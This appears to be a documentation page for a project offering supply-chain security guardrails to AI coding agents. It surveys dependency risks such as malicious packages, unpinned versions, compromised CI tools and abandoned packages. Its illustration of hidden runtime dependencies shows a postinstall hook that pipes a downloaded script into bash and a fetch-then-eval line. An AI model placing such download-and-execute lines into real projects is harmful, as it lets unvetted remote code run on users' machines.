# 🎯 Why This Exists

> Understanding the unique challenges AI agents create in software supply chain security

---

## The New Reality

AI agents can analyze requirements, write code, select dependencies, and deploy systems with minimal human intervention. But **this speed creates new risks**.

Traditional OSS governance assumes humans make careful, deliberate decisions. **AI agents don't work that way.**

---

## 🤖 What Agents Can Do (and Why It's Risky)

| Capability | Risk |
|------------|------|
| 📦 **Introduce dependencies rapidly** | 15 packages in seconds vs 30 minutes of human review |
| 📝 **Modify lockfiles/manifests** | Changes bypass typical scrutiny |
| 🌳 **Add transitive dependencies** | Brings dozens of sub-dependencies invisibly |
| 🔧 **Install tools dynamically** | CLI tools, MCP servers without vetting |
| ⚙️ **Add CI/CD actions** | Privileged tools with elevated access |
| 🐳 **Pull container images** | Base images affect entire deployment |

**The gap:** Traditional processes can't keep pace with agent speed.

---

## ⚠️ Top Supply Chain Risks

### 1. 🎭 Malicious Packages

**Real incidents:**
- [event-stream](https://snyk.io/blog/a-post-mortem-of-the-malicious-event-stream-backdoor/) (2018): 8M downloads affected
- [ua-parser-js](https://github.com/advisories/GHSA-pjwm-rvh2-c87w) (2021): Cryptominer injected
- [colors.js/faker.js](https://www.bleepingcomputer.com/news/security/dev-corrupts-npm-libs-colors-and-faker-breaking-thousands-of-apps/) (2022): Intentional sabotage

**Agent risk:** May not detect typosquatting or compromised packages.

---

### 2. 🔓 Weak Version Pinning

**Risk:** Unpinned versions allow malicious updates to auto-install.

**Example:**
```json
"dependencies": {
  "express": "^4.0.0",    // Could install 4.99.99
  "lodash": "*",          // ANY version
  "axios": "latest"       // Dangerous in Docker
}
```

---

### 3. 🔌 Privileged Tool Compromise

**Real incidents:**
- [CodeCov breach](https://about.codecov.io/security-update/) (2021): Bash uploader compromised
- [SolarWinds](https://www.cisa.gov/news-events/news/joint-statement-federal-bureau-investigation-fbi-and-cybersecurity-and-infrastructure-security) (2020): Build system compromised

**Agent risk:** CI actions, scanners, and MCP servers often have elevated permissions.

---

### 4. 🕵️ Hidden Runtime Dependencies

**Risk:** Dynamic downloads bypass manifest visibility and security scanning.

**Example:**
```bash
"postinstall": "curl https://example.com/script.sh | bash"

fetch('https://cdn.example.com/module.js').then(eval)
```

---

### 5. 💀 Abandoned Packages

**Risk:** No security patches, unresponsive maintainers, single point of failure.

**Signals:**
- Last commit: 3+ years ago
- Open security issues: 12+
- Maintainers: 1 person (unresponsive)

---

## 🌉 The Gap in Traditional Approaches

Traditional OSS governance doesn't work well for agents:

| Traditional | Why It Fails for Agents |
|------------|-------------------------|
| 📄 Written for humans | Agents need machine-readable instructions |
| 🏢 Policy documents | Agents can't follow 50-page PDFs |
| 🔀 One-size-fits-all | Doesn't adapt to agent capabilities |
| 🌍 Generic guidance | Not ecosystem-specific |

### What Teams Need

✅ **Agent-readable constraints** in consumable formats  
✅ **Modular guidance** that adapts to capabilities  
✅ **Ecosystem-specific** rules (npm ≠ pip ≠ Maven)  
✅ **Context-aware** (prototype ≠ production)

---

## 🎯 What These Guardrails Do

### ✅ Encourage safer patterns:
- Minimal dependencies
- Well-maintained packages
- Version pinning
- Dependency visibility
- Official registries
- Review for privileged tools

### ✅ Adapt to context:
- Prototype: reasonable safety + speed
- Production: strict controls
- Regulated: maximum scrutiny

### ✅ Support different ecosystems:
- npm, pip, Maven, containers
- Each has unique risks

---

## ❌ What This Does NOT Replace

| Traditional Tool | Still Needed For |
|-----------------|------------------|
| 🔍 **SCA (Software Composition Analysis)** | Automated vulnerability scanning |
| 📋 **SBOM Generation** | Comprehensive software bills of materials |
| 👥 **Code Review** | Human architectural decisions |
| 🚨 **Vulnerability Management** | Incident response and remediation |

---

## 🛡️ Defense in Depth

```
1️⃣  AGENT GUARDRAILS → Prevent bad dependencies from entering
                ↓
2️⃣  SCA / SBOM TOOLS → Scan what did get added
                ↓
3️⃣  CODE REVIEW → Human review of changes
                ↓
4️⃣  VULNERABILITY MGMT → Monitor and respond
```

Each layer strengthens the others. Guardrails make SCA more effective by reducing noise.

---

## 🚀 Moving Forward

AI agents are inevitable and beneficial. **We need to adapt our security practices** to this new reality.

These guardrails are a step toward **safer AI-assisted development**—practical instructions that help agents make better dependency decisions.

[👉 Learn how to choose guardrails](how-to-choose.md)

---

<div align="center">

[⬆ Back to Main README](../README.md)

</div>
